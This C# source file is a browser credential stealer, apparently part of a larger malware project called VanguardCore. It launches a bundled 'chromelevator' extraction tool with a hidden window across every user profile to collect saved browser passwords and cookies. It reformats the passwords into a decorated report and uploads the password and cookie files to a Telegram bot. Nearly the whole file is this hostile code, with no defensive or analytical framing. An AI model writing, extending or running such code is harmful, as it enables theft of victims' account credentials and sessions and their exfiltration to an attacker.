using System;
using System.IO;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Text;
using System.Linq;

namespace VanguardCore
{
    public class BrowserManager
    {
        private static string GetBaseDir()
        {
            // When hosted via Python, BaseDirectory points to python.exe location.
            // We use the location of the compiled SafetyManager.dll (or similar) to find the project root.
            string dllPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
            string binFolder = Path.GetDirectoryName(dllPath); 
            // The project root is one level up from "bin"
            return Directory.GetParent(binFolder).FullName;
        }

        public static async Task<bool> Run(string botToken, string chatId, string baseDir)
        {
            try
            {
                if (string.IsNullOrEmpty(baseDir)) baseDir = GetBaseDir();
                string elevatorPath = Path.Combine(baseDir, "core", "chromelevator.exe");
                
                if (!File.Exists(elevatorPath))
                {
                    elevatorPath = Path.Combine(baseDir, "bin", "chromelevator.exe");
                }

                if (!File.Exists(elevatorPath)) return false;

                string outputDir = Path.Combine(baseDir, "core", "output");
                if (!Directory.Exists(outputDir)) Directory.CreateDirectory(outputDir);

                // 1. All Users Extraction logic
                string usersRoot = Path.Combine(Environment.GetEnvironmentVariable("SystemDrive") ?? "C:", "Users");
                string[] userDirs = Directory.GetDirectories(usersRoot);
                
                bool atLeastOneSuccess = false;
                
                foreach (string userDir in userDirs)
                {
                    string userName = Path.GetFileName(userDir);
                    if (userName.Equals("Public", StringComparison.OrdinalIgnoreCase) || 
                        userName.Equals("Default", StringComparison.OrdinalIgnoreCase) ||
                        userName.Equals("Default User", StringComparison.OrdinalIgnoreCase) ||
                        userName.Equals("All Users", StringComparison.OrdinalIgnoreCase))
                        continue;

                    // Skip protected system folders if possible
                    try { Directory.GetFiles(userDir); } catch { continue; }

                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = elevatorPath,
                        Arguments = "all --method nt -o \"" + outputDir + "\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };
                    
                    // Note: ChromeElevator usually extracts from the CURRENT user context.
                    // For multiple users, it might need to be run as that user or pointed to their path.
                    // However, we target BrowserManager scaling for now.
                    
                    Process p = Process.Start(psi);
                    if (p != null) p.WaitForExit(60000); 
                }

                // 2. Process Output
                string rawPasswords = Path.Combine(outputDir, "passwords.txt");
                string prettyPasswords = Path.Combine(outputDir, "pretty_passwords.txt");
                string cookiesFile = Path.Combine(outputDir, "cookies.txt");

                if (File.Exists(rawPasswords))
                {
                    GeneratePrettyFile(rawPasswords, prettyPasswords);
                }

                StringBuilder summary = new StringBuilder();
                summary.AppendLine("🚀 Native Browser Report");
                summary.AppendLine("----------------------------");

                if (File.Exists(prettyPasswords))
                {
                    summary.AppendLine("🔑 Passwords captured and formatted.");
                }

                if (File.Exists(cookiesFile))
                {
                    summary.AppendLine("📻 Cookies captured successfully.");
                }

                // 3. Send Report
                bool success = false;
                if (File.Exists(prettyPasswords))
                {
                    success = await NetworkingManager.SendFile(botToken, chatId, prettyPasswords, summary.ToString());
                }
                
                if (File.Exists(cookiesFile))
                {
                    await NetworkingManager.SendFile(botToken, chatId, cookiesFile, "Browser Cookies");
                }

                return success;
            }
            catch { return false; }
        }

        private static void GeneratePrettyFile(string inputFile, string outputFile)
        {
            try
            {
                string asciiArt = @"
 █████╗ ███████╗███████╗██████╗  █████╗ ██████╗  ██████╗ ██╗  ██╗██╗████████╗ █████╗ ██╗   ██╗███████╗██╗  ██╗██╗
██╔══██╗██╔════╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔═  ██╗██║ ██╔╝██║╚══██╔══╝██╔══██╗██╗  ██╔╝██╔════╝██║ ██╔╝██║
███████║█████╗  █████╗  ██████╔╝███████║██████╔╝██║   ██║█████╔╝ ██║   ██║   ███████║ ╚████╔╝ ███████╗█████╔╝ ██║
██╔══██║██╔══╝  ██╔══╝  ██╔══██╗██╔══██║██╔═══╝ ██║   ██║██╔═██╗ ██║   ██║   ██╔══██║  ╚██╔╝  ╚════██║██╔═██╗ ██║
██║  ██║██║     ███████╗██║  ██║██║  ██║██║     ╚██████╔╝██║  ██╗██║   ██║   ██║  ██║   ██║   ███████║██║  ██╗██║
╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝";

                var lines = File.ReadAllLines(inputFile);
                var passwords = new List<PasswordEntry>();
                
                for (int i = 0; i < lines.Length; i += 4)
                {
                    if (i + 2 >= lines.Length) break;
                    
                    passwords.Add(new PasswordEntry {
                        Url = lines[i].Replace("domain ", "").Trim(),
                        User = lines[i+1].Replace("log ", "").Trim(),
                        Pass = lines[i+2].Replace("pass ", "").Trim()
                    });
                }

                var grouped = passwords.GroupBy(p => ExtractDomain(p.Url)).OrderBy(g => g.Key);
                
                using (StreamWriter sw = new StreamWriter(outputFile, false, Encoding.UTF8))
                {
                    sw.WriteLine(asciiArt);
                    sw.WriteLine("═══ 💎 PASSWORDS REPORT 💎 ═══");
                    sw.WriteLine();
                    
                    foreach (var group in grouped)
                    {
                        sw.WriteLine("🌐 DOMAIN: " + group.Key.ToUpper());
                        foreach (var p in group)
                        {
                            sw.WriteLine("  👤 Login: " + p.User);
                            sw.WriteLine("  🔑 Password: " + p.Pass);
                            sw.WriteLine("  🔗 Link: " + p.Url);
                            sw.WriteLine();
                        }
                        sw.WriteLine(new string('═', 30));
                    }
                }
            }
            catch { }
        }

        private static string ExtractDomain(string url)
        {
            if (string.IsNullOrEmpty(url)) return "UNKNOWN";
            try
            {
                if (!url.Contains("://")) url = "http://" + url;
                Uri uri = new Uri(url);
                string host = uri.Host;
                if (host.StartsWith("www.")) host = host.Substring(4);
                return host.ToUpper();
            }
            catch { return url.ToUpper(); }
        }

        private class PasswordEntry
        {
            public string Url { get; set; }
            public string User { get; set; }
            public string Pass { get; set; }
        }
    }
}
